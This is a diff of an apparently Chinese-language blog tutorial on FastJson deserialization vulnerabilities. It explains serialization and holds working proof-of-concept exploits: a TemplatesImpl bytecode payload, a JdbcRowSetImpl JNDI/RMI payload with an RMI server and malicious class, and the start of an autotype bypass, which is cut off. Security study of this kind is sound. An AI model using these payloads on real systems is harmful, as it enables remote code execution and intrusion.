@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -289,12 +289,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
-    <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
-    <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
-    <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
-<span class="nt">&lt;/dependency&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
@@ -310,17 +310,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//序列化
-</span><span class="c1"></span><span class="n">String</span> <span class="n">str</span><span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user1</span><span class="o">);</span> 
-<span class="c1">//结果: {&#34;age&#34;:18,&#34;name&#34;:&#34;xiaoming&#34;}
-</span><span class="c1"></span><span class="n">String</span> <span class="n">str</span><span class="o">=</span><span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user1</span><span class="o">,</span> <span class="n">SerializerFeature</span><span class="o">.</span><span class="na">WriteClassName</span><span class="o">);</span>
-<span class="c1">//结果: {&#34;@type&#34;:&#34;fastjson.User&#34;,&#34;age&#34;:18,&#34;name&#34;:&#34;xiaoming&#34;}
-</span><span class="c1"></span>
-<span class="c1">//反序列化
-</span><span class="c1"></span><span class="n">Object</span> <span class="n">user1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">str</span><span class="o">);</span> <span class="c1">//解析为Object类型或者JSONArray类型
-</span><span class="c1"></span><span class="n">JSONObject</span> <span class="n">user1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">str</span><span class="o">);</span> <span class="c1">//JSON文本解析成JSONObject类型
-</span><span class="c1"></span><span class="n">User</span> <span class="n">user1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="n">User</span><span class="o">.</span><span class="na">class</span><span class="o">);</span> <span class="c1">//JSON文本解析成指定的User.class类
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//序列化
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">String</span> <span class="n">str</span><span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user1</span><span class="o">);</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">//结果: {&#34;age&#34;:18,&#34;name&#34;:&#34;xiaoming&#34;}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">String</span> <span class="n">str</span><span class="o">=</span><span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user1</span><span class="o">,</span> <span class="n">SerializerFeature</span><span class="o">.</span><span class="na">WriteClassName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//结果: {&#34;@type&#34;:&#34;fastjson.User&#34;,&#34;age&#34;:18,&#34;name&#34;:&#34;xiaoming&#34;}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">//反序列化
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Object</span> <span class="n">user1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">str</span><span class="o">);</span> <span class="c1">//解析为Object类型或者JSONArray类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">JSONObject</span> <span class="n">user1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">str</span><span class="o">);</span> <span class="c1">//JSON文本解析成JSONObject类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">User</span> <span class="n">user1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="n">User</span><span class="o">.</span><span class="na">class</span><span class="o">);</span> <span class="c1">//JSON文本解析成指定的User.class类
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>序列化时，传入<code>SerializerFeature.WriteClassName</code>可以使得序列化成JSON的数据多一个@type，这个是代表对象类型的JSON文本。并且FastJson会调用对象成员对应的get方法，被private修饰且没有get方法的成员不会被序列化。</p>
 <p><code>JSON.parseObject</code>方法中没指定对象，返回的则是JSONObject的对象。<code>JSON.parseObject</code>只是在<code>JSON.parse</code>的基础上做了一个封装。在反序列化时，会调用了指定类的全部的setter（publibc修饰）进行赋值。</p>
@@ -373,48 +373,48 @@
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">javassist.ClassClassPath</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">try</span><span class="o">{</span>
-            <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
-            <span class="n">CtClass</span> <span class="n">clas</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">&#34;Evil&#34;</span><span class="o">);</span>
-            <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
-            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#34;Runtime.getRuntime().exec(\&#34;calc.exe\&#34;);&#34;</span><span class="o">;</span>
-            <span class="n">clas</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
-            <span class="n">clas</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">getCtClass</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span>
-
-            <span class="kt">byte</span><span class="o">[]</span> <span class="n">evilCode</span> <span class="o">=</span> <span class="n">clas</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
-            <span class="n">String</span> <span class="n">evilCode_base64</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">evilCode</span><span class="o">);</span>
-            <span class="kd">final</span> <span class="n">String</span> <span class="n">NASTY_CLASS</span> <span class="o">=</span> <span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="o">;</span>
-            <span class="n">String</span> <span class="n">text1</span> <span class="o">=</span> <span class="s">&#34;{&#34;</span><span class="o">+</span>
-                    <span class="s">&#34;\&#34;@type\&#34;:\&#34;&#34;</span> <span class="o">+</span> <span class="n">NASTY_CLASS</span> <span class="o">+</span><span class="s">&#34;\&#34;,&#34;</span><span class="o">+</span>
-                    <span class="s">&#34;\&#34;_bytecodes\&#34;:[\&#34;&#34;</span><span class="o">+</span><span class="n">evilCode_base64</span><span class="o">+</span><span class="s">&#34;\&#34;],&#34;</span><span class="o">+</span>
-                    <span class="s">&#34;&#39;_name&#39;:&#39;a.b&#39;,&#34;</span><span class="o">+</span>
-                    <span class="s">&#34;&#39;_tfactory&#39;:{ },&#34;</span><span class="o">+</span>
-                    <span class="s">&#34;&#39;_outputProperties&#39;:{ }&#34;</span><span class="o">+</span>
-                    <span class="s">&#34;}\n&#34;</span><span class="o">;</span>
-
-            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">text1</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Feature</span><span class="o">.</span><span class="na">SupportNonPublicField</span><span class="o">);</span>
-        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span>
-        <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassClassPath</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">CtClass</span> <span class="n">clas</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">&#34;Evil&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#34;Runtime.getRuntime().exec(\&#34;calc.exe\&#34;);&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clas</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clas</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">getCtClass</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">evilCode</span> <span class="o">=</span> <span class="n">clas</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">evilCode_base64</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">evilCode</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">NASTY_CLASS</span> <span class="o">=</span> <span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">text1</span> <span class="o">=</span> <span class="s">&#34;{&#34;</span><span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;\&#34;@type\&#34;:\&#34;&#34;</span> <span class="o">+</span> <span class="n">NASTY_CLASS</span> <span class="o">+</span><span class="s">&#34;\&#34;,&#34;</span><span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;\&#34;_bytecodes\&#34;:[\&#34;&#34;</span><span class="o">+</span><span class="n">evilCode_base64</span><span class="o">+</span><span class="s">&#34;\&#34;],&#34;</span><span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;&#39;_name&#39;:&#39;a.b&#39;,&#34;</span><span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;&#39;_tfactory&#39;:{ },&#34;</span><span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;&#39;_outputProperties&#39;:{ }&#34;</span><span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;}\n&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">text1</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Feature</span><span class="o">.</span><span class="na">SupportNonPublicField</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><ol>
 <li>
@@ -454,16 +454,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
-        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;, \&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/obj\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>dataSourceName参数在解析时候则会调用setDataSourceName对DataSourceName变量进行赋值。autoCommit也一样会调用setAutoCommit方法，在该方法中调用了connect()方法对lookup()传入了DataSourceNamece变量的值。</p>
 <p>RMI Server</p>
@@ -493,29 +493,29 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIServer</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;http://127.0.0.1:8080/&#34;</span><span class="o">;</span>
-            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
-            <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
-            <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
-            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;obj&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
-            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;running&#34;</span><span class="o">);</span>
-        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIServer</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;http://127.0.0.1:8080/&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;obj&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;running&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>test.java</p>
 <div class="highlight"><div class="chroma">
@@ -534,19 +534,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="nf">test</span><span class="o">()</span> <span class="o">{</span>
-    <span class="o">}</span>
-    <span class="kd">static</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc.exe&#34;</span><span class="o">);</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">test</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc.exe&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="fastjson-绕过"><a href="#fastjson-绕过" class="anchor-link">#</a><a href="#contents:fastjson-绕过" class="headings">FastJson 绕过</a></h2>
 <h3 id="1225--fastjson--1241"><a href="#1225--fastjson--1241" class="anchor-link">#</a><a href="#contents:1225--fastjson--1241" class="headings">1.2.25 ≤ FastJson ≤ 1.2.41</a></h3>
@@ -577,20 +577,20 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-<span class="c1">//需要开启autotype
-</span><span class="c1"></span>        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
